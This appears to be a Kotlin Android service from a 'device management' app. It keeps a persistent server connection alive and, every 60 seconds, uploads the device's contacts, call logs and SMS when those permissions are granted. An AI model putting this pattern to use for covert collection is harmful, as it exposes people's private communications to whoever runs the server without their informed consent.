package com.example.service

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.example.DeviceManagerApp
import com.example.MainActivity
import com.example.R
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

class DeviceManagementService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var syncJob: Job? = null

    override fun onCreate() {
        super.onCreate()
        startForegroundNotification()
        startPeriodicSync()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundNotification()
        try {
            val app = application as? DeviceManagerApp
            if (app?.preferenceManager?.isPaired() == true) {
                app.webSocketManager.connect()
            }
        } catch (e: Exception) {
            Log.e("DeviceManagementService", "Error during onStartCommand: ${e.message}")
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        syncJob?.cancel()
        try {
            val app = application as? DeviceManagerApp
            app?.webSocketManager?.disconnect()
        } catch (_: Exception) {}
        super.onDestroy()
    }

    private fun startForegroundNotification() {
        try {
            val app = application as? DeviceManagerApp
            val serverUrl = app?.preferenceManager?.getServerUrl() ?: "Management Server"

            // Ensure notification channel exists before posting
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val existingChannel = notificationManager.getNotificationChannel(DeviceManagerApp.CHANNEL_SERVICE)
                if (existingChannel == null) {
                    val channelName = try {
                        getString(R.string.service_notification_channel_name)
                    } catch (_: Exception) {
                        "Device Management Service"
                    }
                    val channelDesc = try {
                        getString(R.string.service_notification_channel_desc)
                    } catch (_: Exception) {
                        "Active background synchronization"
                    }
                    val newChannel = NotificationChannel(
                        DeviceManagerApp.CHANNEL_SERVICE,
                        channelName,
                        NotificationManager.IMPORTANCE_LOW
                    ).apply {
                        description = channelDesc
                        setShowBadge(false)
                    }
                    notificationManager.createNotificationChannel(newChannel)
                }
            }

            val openIntent = Intent(this, MainActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
                putExtra("navigate_to", "permissions")
            }
            val pendingIntent = PendingIntent.getActivity(
                this,
                0,
                openIntent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )

            val title = try {
                getString(R.string.service_notification_title)
            } catch (_: Exception) {
                "Device Management Active"
            }

            val notification = NotificationCompat.Builder(this, DeviceManagerApp.CHANNEL_SERVICE)
                .setSmallIcon(R.drawable.ic_stat_device)
                .setContentTitle(title)
                .setContentText("Connected to $serverUrl • Tap to view status")
                .setOngoing(true)
                .setContentIntent(pendingIntent)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .build()

            var started = false
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                try {
                    startForeground(SERVICE_NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                    started = true
                } catch (typeEx: Throwable) {
                    Log.w("DeviceManagementService", "startForeground with DATA_SYNC type failed: ${typeEx.message}")
                    try {
                        if (Build.VERSION.SDK_INT >= 34) {
                            // On Android 14+, try FOREGROUND_SERVICE_TYPE_SPECIAL_USE if available or fallback
                            startForeground(SERVICE_NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                            started = true
                        } else {
                            startForeground(SERVICE_NOTIFICATION_ID, notification)
                            started = true
                        }
                    } catch (typeEx2: Throwable) {
                        Log.e("DeviceManagementService", "Secondary startForeground attempt failed: ${typeEx2.message}")
                    }
                }
            } else {
                try {
                    startForeground(SERVICE_NOTIFICATION_ID, notification)
                    started = true
                } catch (ex: Throwable) {
                    Log.e("DeviceManagementService", "Pre-Q startForeground failed: ${ex.message}")
                }
            }

            if (!started) {
                Log.e("DeviceManagementService", "Could not promote service to foreground. Attempting force-promotion to ensure process stability.")
                try {
                    startForeground(SERVICE_NOTIFICATION_ID, notification)
                } catch (_: Throwable) {}
            }
        } catch (fatal: Throwable) {
            Log.e("DeviceManagementService", "Fatal error in startForegroundNotification: ${fatal.message}", fatal)
        }
    }

    private fun startPeriodicSync() {
        syncJob?.cancel()
        syncJob = scope.launch {
            val app = application as? DeviceManagerApp ?: return@launch
            while (isActive) {
                try {
                    if (app.preferenceManager.isPaired()) {
                        app.repository.syncTelemetry()
                        app.repository.syncPermissions()

                        val perms = app.repository.permissionsHelper.checkAllPermissions()
                        if (perms.contacts) {
                            app.repository.syncContacts()
                        }
                        if (perms.calls) {
                            app.repository.syncCalls()
                        }
                        if (perms.sms) {
                            app.repository.syncSMS()
                        }
                    }
                } catch (e: Exception) {
                    Log.w("DeviceManagementService", "Periodic sync error: ${e.message}")
                }
                delay(60_000) // Sync every 60 seconds
            }
        }
    }

    companion object {
        const val SERVICE_NOTIFICATION_ID = 1001
    }
}
